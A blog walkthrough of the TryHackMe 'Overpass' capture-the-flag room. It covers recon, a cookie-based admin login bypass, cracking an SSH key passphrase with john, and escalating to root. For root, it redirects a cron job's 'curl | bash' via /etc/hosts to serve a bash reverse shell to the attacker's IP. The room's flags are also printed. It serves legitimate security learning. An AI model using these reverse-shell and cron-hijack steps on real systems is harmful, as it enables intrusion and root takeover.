---
title: "[CTF] Tryhackme - Overpass "
date: 2024-10-12 12:00:00 -500 
categories: [CTF - Tryhackme, Overpass]
tags: [ctf,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[TryHackMe- Overpass ](https://tryhackme.com/r/room/overpass)

## Tasks

- Hack the machine and get the flag in user.txt
- Escalate your privileges and get the flag in root.txt



### Hack the machine and get the flag in user.txt


We start like always - with `nmap` to find open ports and services.

```bash
└─$ nmap  -sC -sV $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 14:29 CST
Nmap scan report for 10.10.109.109
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.24 seconds

```


Our open ports are `22`(SSH) and `80`(HTTP). We have several options here.

#### Options:

- Investigate the Website manually and check `source code`
- Investigate vulnerabilities in Service Versions via `searchsploit`
- Attack Website via `nikto`




### Investigate the Website manually and check `source code`


I didnt get much information from the webpage but I found some potential `usernames`:

```html

            <p class="aboutText">Ninja - Lead Developer</p>
            <p class="aboutText">Pars - Shibe Enthusiast and Emotional Support Animal Manager</p>
            <p class="aboutText">Szymex - Head Of Security</p>
            <p class="aboutText">Bee - Chief Drinking Water Coordinator</p>
            <p class="aboutText">MuirlandOracle - Cryptography Consultant</p>
        </div>
```

### Investigate vulnerabilities in Service Versions via `searchsploit`


We have here `Golang net/http server (Go-IPFS json-rpc or InfluxDB API)` as Webserver ...
Lets have a look if there are some vulnerabilities:

After several titles tries I found:

```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ searchsploit -t json-rpc
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                   |  Path
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution                                                                                          | php/webapps/39937.py
μTorrent (uTorrent) Classic/Web - JSON-RPC Remote Code Execution / Information Disclosure                                                       | multiple/remote/44151.txt
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


Lets copy the script in our home directory via `-m`:
```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ searchsploit -m php/webapps/39937.py
  Exploit: Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution
      URL: https://www.exploit-db.com/exploits/39937
     Path: /usr/share/exploitdb/exploits/php/webapps/39937.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/admin/39937.py
```

We store that and check if there are other possibilities  first.



### Attack Website via `nikto`

With `nikto` we found some interesting paths:

```bash

┌──(admin㉿PREDATOR-01)-[~]
└─$ nikto -h $ip
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.109.109
+ Target Hostname:    10.10.109.109
+ Target Port:        80
+ Start Time:         2024-10-15 14:33:25 (GMT8)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /admin.html: This might be interesting.
+ /admin/: This might be interesting.
+ /css/: This might be interesting.
+ /downloads/: This might be interesting.
+ /img/: This might be interesting.

``` 


We checkout `/admin` and we have a login window there. Lets investigate the functions:



```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

After a bit digging I found the `login()` function, which has a big vulnerability: `SessionCookie`!

Lets pay attention here to that line: 
```js  
  if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value="" } 
    else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
``` 

That could mean, that it will only deny you access to the admin page if there's a cookie set on your machine called "SessionToken" and its value is "Incorrect credentials". 

Lets try to create a session cookie to prove our theory:


![Cookies-create](assets/img/tryhackme/Overpass/overpass-01.png "Cookies-create")
 
We just changed the `name` to `SessionToken` and refreshed the webpage and we are logged in!

Now we have a private key:



![Login_admin](assets/img/tryhackme/Overpass/overpass-02.png "Login_admin")


Okay, so far so good. Lets save this key as `textfile` and try to use `ssh` with the user `james`.


```bash
┌──(admin㉿PREDATOR-01)-[~/overpass]
└─$ ssh james@$ip -i ssh_privkey.txt
Enter passphrase for key 'ssh_privkey.txt':
```

The private key is password protected which means we have to crack that. We use `john2ssh` to convert it and `john` to crack the key:

```bash
┌──(admin㉿PREDATOR-01)-[~/overpass]
└─$ ssh2john ssh_privkey.txt > crack_this_key
```
```bash

┌──(admin㉿PREDATOR-01)-[~/overpass]
└─$ john crack_this_key
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 24 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
james13          (ssh_privkey.txt)
1g 0:00:00:01 DONE 3/3 (2024-10-15 15:19) 0.6622g/s 945086p/s 945086c/s 945086C/s jamest1..jamanah
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
``` 

And our password for the key is `james13`!!!

Lets try to connect with `ssh`now:

```bash

┌──(admin㉿PREDATOR-01)-[~/overpass]
└─$ ssh james@$ip -i ssh_privkey.txt
Enter passphrase for key 'ssh_privkey.txt':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 15 07:21:11 UTC 2024

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.109.109
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$

```

We are connected!!

Lets search the `user flag`.
```bash
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
```

Answer: `thm{65c1aaf000506e56996822c6281e6bf7}`



### Escalate your privileges and get the flag in root.txt

We dont have a proper `password` so lets try to find some vulnerabilities with `linepeas.sh`

With `scp` we can send the script over to the target:

```bash

└─$ scp -i ~/overpass/ssh_privkey.txt ~/scripts/linepeas.sh  james@$ip:~
Enter passphrase for key '/home/admin/overpass/ssh_privkey.txt':
linepeas.sh                                                                                                                                      100%  804KB 259.2KB/s   00:03


```

Okay after studying all the potential vulnerabilities I found two easy ways to escalate our priviliges. 

1. `etc/hosts/` is not write protected, which means, we can easily use this for our purpose
2. `cron jobs` look very interesting, the last `cron job` runs every minute a script.

`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`


```bash

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

```

Lets see, what the script does:

```bash
james@overpass-prod:/etc/cron.d$ curl overpass.thm/downloads/src/buildscript.sh
GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
echo "$(date -R) Builds completed" >> /root/buildStatus
```

Okay lets cook. We will do it in 4 Steps:

1. Change `hosts` file 
2. Write script for `reverse shell`
3. Create local webserver with the same paths ( overpass.thm/downloads/src/buildscript.sh)
4. Listen via netcat

### 1. Change `hosts` file:

We edit the `hosts` file in `etc/hosts`
```bash
james@overpass-prod:/etc$ cat hosts
#127.0.0.1 localhost
#127.0.1.1 overpass-prod
#127.0.0.1 overpass.thm
#The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.8.24.XX overpass.thm
```

We added our local `ip address` and commented the `127.0.0.1` `overpass.thm`.


### 2. Write script for `reverse shell`

For reverse shells, go to [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


We use this one:

`bash -i >& /dev/tcp/10.8.24.27/4444 0>&1`

and save it as file: `buildscript.sh`


### 3. Create local webserver with the same paths

we create directories: `downloads/src` and move our script `buildscript.sh` there.


Then we start our local webserver: 

`python3 -m http.server 80`


We can check in our browser with `http://127.0.0.1` if we can find our path.

Also we can try to use `james` account (ssh) if he can see the script content via 

`curl overpass.thm/downloads/src/buildscript.sh`

### 4. Listen via netcat

Last step is very easy: 

```bash

└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.24.27] from (UNKNOWN) [10.10.109.109] 45932
bash: cannot set terminal process group (18509): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~#
```


After a few minutes we have a connection!


```bash

cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}

```


Answer: `thm{7f336f8c359dbac18d54fdd64ea753bb}`



## Thoughts:

Very cool CTF, where you are not so guided as normally. I think there are several options to get access to the system, which makes it a bit challenging. 

What did we learn?
- using `nmap` for scan open ports and versions
- using `searchsploit` to find a vulnerablity
- using browser tools to create a cookie 
- using `nikto` to attack the webpage
- using `john` for cracking password protected private key
- using `linepeas.sh` for search for vulnerabilities
- modify `hosts` file
- create a local `webserver`
- write a bash `reverse shell`

